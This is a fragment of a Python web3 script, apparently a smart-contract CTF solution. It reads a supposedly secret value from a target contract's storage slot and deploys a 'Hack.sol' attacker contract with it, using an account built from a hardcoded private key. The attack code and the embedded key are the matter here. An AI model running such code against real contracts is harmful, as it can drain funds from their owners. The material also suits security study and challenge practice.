...
# Get an account
account = Account.from_key(b'\x1e\x8eR\xf0\xaa\xa2ENW\xe9\xcd\x10Z\x8e\x9b\x069J\xf9\xb6\xc6\xbeMP\xb4\x16\xb88\xdf\x8f\x189')
TARGET = Web3.toChecksumAddress("0xd630cb8c3bbfd38d1880b8256ee06d168ee3859c")
...
secret = Web3.toInt(get_storage(w3, TARGET, 3))

# Boilerplate code to deploy a contract
compiled = compile_files(["Hack.sol"], output_values=["abi", "bin"], base_path=".", allow_paths=["../.."])['Hack.sol:Deploy']
Hack = w3.eth.contract(abi=compiled['abi'], bytecode=compiled['bin'])
tx = Hack.constructor(TARGET, secret).buildTransaction({
    'from': account.address,
    'value': 2*100000000000000,
})
